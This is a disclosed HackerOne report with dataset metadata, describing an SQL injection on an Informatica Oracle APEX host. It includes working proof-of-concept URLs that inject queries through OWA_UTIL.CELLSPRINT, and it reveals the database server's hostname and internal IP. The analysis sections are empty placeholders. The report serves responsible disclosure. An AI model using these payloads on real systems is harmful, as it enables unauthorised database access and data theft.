---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '178632'
original_report_id: '178632'
title: '[afocusp.informatica.com] Sql injection  afocusp.informatica.com:37777'
weakness: SQL Injection
team_handle: informatica
created_at: '2016-10-28T16:44:14.989Z'
disclosed_at: '2017-01-21T19:05:37.398Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- sql-injection
---

# [afocusp.informatica.com] Sql injection  afocusp.informatica.com:37777

## Metadata

- HackerOne Report ID: 178632
- Weakness: SQL Injection
- Program: informatica
- Disclosed At: 2017-01-21T19:05:37.398Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hi !There is another sql injection on host  afocusp.informatica.com:37777

POC 
version
http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version

hostname of the database server 
psvlxtdapp1.inf

http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual

IP address of the database server (local)
10.1.192.93 

http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual

Ps
You need to patch all servers with the url /pls/apex/f? this is  old bug in oracle.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
